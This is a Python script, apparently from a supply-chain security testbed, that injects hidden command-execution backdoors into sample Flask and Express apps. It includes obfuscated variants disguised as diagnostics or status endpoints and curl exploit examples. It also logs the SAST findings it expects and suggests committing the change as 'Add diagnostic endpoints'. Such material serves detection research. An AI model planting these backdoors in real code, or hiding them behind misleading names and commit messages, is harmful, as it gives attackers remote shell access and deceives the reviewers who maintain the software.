#!/usr/bin/env python3
"""
Attack Scenario 2.3: Source Code Backdoor Injection
=====================================================

Injects hidden backdoor into application source code with command execution capability.

RESEARCH ONLY - Academic purposes, controlled environment.
"""

import os
import sys
import json
from pathlib import Path
from datetime import datetime
import shutil


class CodeBackdoorAttack:
    """Simulates source code backdoor injection."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        # Target both frontend and backend
        self.backend_file = self.repo_root / "sample-apps" / "backend-api" / "src" / "app.py"
        self.frontend_file = self.repo_root / "sample-apps" / "frontend" / "src" / "server.js"
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')

    def inject_backend_backdoor(self, obfuscated=True):
        """Inject backdoor into Python backend."""
        print(f"[*] Injecting backend backdoor (obfuscated={obfuscated})...")

        if not self.backend_file.exists():
            # Create minimal app.py if doesn't exist
            self.backend_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.backend_file, 'w') as f:
                f.write('''from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/')
def home():
    return 'OK'

@app.route('/health')
def health():
    return 'healthy'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
''')
            print("[*] Created minimal app.py")

        # Backup
        backup = self.backend_file.parent / f"app.py.backup.{self.backup_suffix}"
        shutil.copy(self.backend_file, backup)

        with open(self.backend_file, 'r') as f:
            content = f.read()

        if obfuscated:
            # Obfuscated backdoor (harder to detect)
            backdoor = '''
# RESEARCH ATTACK: Obfuscated backdoor
@app.route('/api/diagnostics')
def diagnostics():
    """System diagnostics endpoint"""
    import base64
    import subprocess

    # Hidden debug mode
    h = request.headers.get('X-Config', '')
    if h:
        try:
            cmd = base64.b64decode(h).decode()
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return {'status': 'ok', 'data': base64.b64encode(result).decode()}
        except:
            pass
    return {'status': 'healthy', 'uptime': '99.9%'}
'''
        else:
            # Clear backdoor (easier to detect)
            backdoor = '''
# RESEARCH ATTACK: Hidden backdoor
@app.route('/admin/debug')
def admin_debug():
    """Debug endpoint - DO NOT USE IN PRODUCTION"""
    import subprocess

    # Command execution via header
    if request.headers.get('X-Debug-Mode') == 'enable':
        cmd = request.headers.get('X-Command', 'echo test')
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
            return {'output': result.decode(), 'success': True}
        except Exception as e:
            return {'error': str(e), 'success': False}

    return {'message': 'Debug mode not enabled'}
'''

        # Inject backdoor before main execution
        if "if __name__ == '__main__':" in content:
            content = content.replace(
                "if __name__ == '__main__':",
                backdoor + "\nif __name__ == '__main__':"
            )
        else:
            content += backdoor

        with open(self.backend_file, 'w') as f:
            f.write(content)

        print(f"[OK] Backend backdoor injected")
        return True

    def inject_frontend_backdoor(self, obfuscated=True):
        """Inject backdoor into Node.js frontend."""
        print(f"[*] Injecting frontend backdoor (obfuscated={obfuscated})...")

        if not self.frontend_file.exists():
            # Create minimal server.js
            self.frontend_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.frontend_file, 'w') as f:
                f.write('''const express = require('express');
const app = express();

app.get('/', (req, res) => {
  res.send('OK');
});

app.get('/health', (req, res) => {
  res.send('healthy');
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
''')
            print("[*] Created minimal server.js")

        # Backup
        backup = self.frontend_file.parent / f"server.js.backup.{self.backup_suffix}"
        shutil.copy(self.frontend_file, backup)

        with open(self.frontend_file, 'r') as f:
            content = f.read()

        if obfuscated:
            # Obfuscated version
            backdoor = '''
// RESEARCH ATTACK: Obfuscated backdoor
const crypto = require('crypto');

app.get('/api/status', (req, res) => {
  const config = req.headers['x-config'];
  if (config) {
    try {
      const { exec } = require('child_process');
      const cmd = Buffer.from(config, 'base64').toString();
      exec(cmd, (err, stdout, stderr) => {
        if (err) {
          res.json({ status: 'ok', data: null });
        } else {
          const encoded = Buffer.from(stdout).toString('base64');
          res.json({ status: 'ok', data: encoded });
        }
      });
    } catch (e) {
      res.json({ status: 'ok' });
    }
  } else {
    res.json({ status: 'ok', uptime: '99.9%' });
  }
});
'''
        else:
            # Clear version
            backdoor = '''
// RESEARCH ATTACK: Hidden debug backdoor
const { exec } = require('child_process');

app.get('/debug/execute', (req, res) => {
  // Hidden command execution
  if (req.headers['x-debug'] === 'true') {
    const cmd = req.query.cmd || 'echo test';
    exec(cmd, { timeout: 5000 }, (error, stdout, stderr) => {
      if (error) {
        res.json({ error: error.message, success: false });
      } else {
        res.json({ output: stdout, success: true });
      }
    });
  } else {
    res.json({ message: 'Debug not enabled' });
  }
});
'''

        # Inject before app.listen
        if 'app.listen' in content:
            content = content.replace('app.listen', backdoor + '\napp.listen')
        else:
            content += backdoor

        with open(self.frontend_file, 'w') as f:
            f.write(content)

        print(f"[OK] Frontend backdoor injected")
        return True

    def log_indicators(self, obfuscated=False):
        """Log behavioral indicators."""
        indicators = {
            "attack_type": "code_backdoor",
            "scenario_id": "2.3",
            "timestamp": datetime.now().isoformat(),
            "obfuscated": obfuscated,
            "indicators": {
                "files_modified": [str(self.backend_file), str(self.frontend_file)],
                "suspicious_imports": ["subprocess", "child_process", "exec"],
                "command_execution_capability": True,
                "hidden_endpoint": True,
                "header_based_trigger": True,
                "base64_encoding": obfuscated,
                "eval_exec_usage": True,
                "environment_access": False,
                "lines_added": 15 if obfuscated else 12,
                "code_obfuscation": obfuscated,
                "entropy_high": obfuscated
            },
            "sast_expected_findings": {
                "bandit": ["subprocess_popen_with_shell_equals_true", "exec_used"],
                "semgrep": ["command-injection", "subprocess-shell-true"],
                "eslint_security": ["detect-child-process", "detect-eval-with-expression"],
                "severity": "high"
            },
            "expected_detection": {
                "difficulty": "hard" if obfuscated else "medium",
                "primary_signals": [
                    "suspicious_imports" if not obfuscated else "base64_encoding",
                    "command_execution_pattern",
                    "sast_findings_increase"
                ],
                "secondary_signals": [
                    "hidden_endpoint",
                    "header_based_trigger",
                    "entropy_anomaly" if obfuscated else "eval_exec_pattern"
                ]
            },
            "exploit_example": {
                "backend": "curl -H 'X-Debug-Mode: enable' -H 'X-Command: whoami' http://localhost:5000/admin/debug",
                "frontend": "curl -H 'x-debug: true' http://localhost:3000/debug/execute?cmd=whoami"
            },
            "mitre_attack": {
                "technique": "T1195.002",
                "name": "Compromise Software Supply Chain",
                "sub_technique": "T1059.004",
                "sub_name": "Unix Shell",
                "tactic": "Execution"
            }
        }

        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        log_file = log_dir / f"code_backdoor_{self.backup_suffix}.json"
        with open(log_file, 'w') as f:
            json.dump(indicators, f, indent=2)

        print(f"[OK] Indicators logged: {log_file}")
        return indicators

    def execute(self, obfuscated=True, target="both"):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 2.3: Source Code Backdoor")
        print("=" * 80)
        print(f"\nObfuscation: {'HIGH' if obfuscated else 'LOW'}")
        print(f"Target: {target}")
        print("[!] RESEARCH ONLY - Controlled environment\n")

        success = True

        if target in ["backend", "both"]:
            if not self.inject_backend_backdoor(obfuscated):
                success = False

        if target in ["frontend", "both"]:
            if not self.inject_frontend_backdoor(obfuscated):
                success = False

        if not success:
            print("\n[FAIL] Injection failed")
            return False

        indicators = self.log_indicators(obfuscated)

        print("\n" + "=" * 80)
        print("ATTACK EXECUTION SUMMARY")
        print("=" * 80)
        print(f"Status: SUCCESS")
        print(f"Obfuscated: {obfuscated}")
        print(f"Detection Difficulty: {indicators['expected_detection']['difficulty']}")

        print(f"\nInjected Backdoors:")
        for file in indicators['indicators']['files_modified']:
            print(f"  - {file}")

        print(f"\nExpected SAST Findings:")
        for tool, findings in indicators['sast_expected_findings'].items():
            if tool != 'severity':
                print(f"  {tool}: {', '.join(findings) if isinstance(findings, list) else findings}")

        print(f"\nExploit Examples:")
        print(f"  Backend: {indicators['exploit_example']['backend']}")
        print(f"  Frontend: {indicators['exploit_example']['frontend']}")

        print(f"\nNext Steps:")
        print(f"  1. Review: git diff")
        print(f"  2. Run SAST tools locally: bandit sample-apps/backend-api/src/app.py")
        print(f"  3. Commit: git commit -m 'Add diagnostic endpoints'")
        print(f"  4. Push and monitor security scans")
        print("=" * 80)

        return True


def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--obfuscated', action='store_true',
                       help='Use obfuscated version (harder to detect)')
    parser.add_argument('--target', choices=['backend', 'frontend', 'both'],
                       default='both', help='Target application')
    args = parser.parse_args()

    attack = CodeBackdoorAttack()
    success = attack.execute(obfuscated=args.obfuscated, target=args.target)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
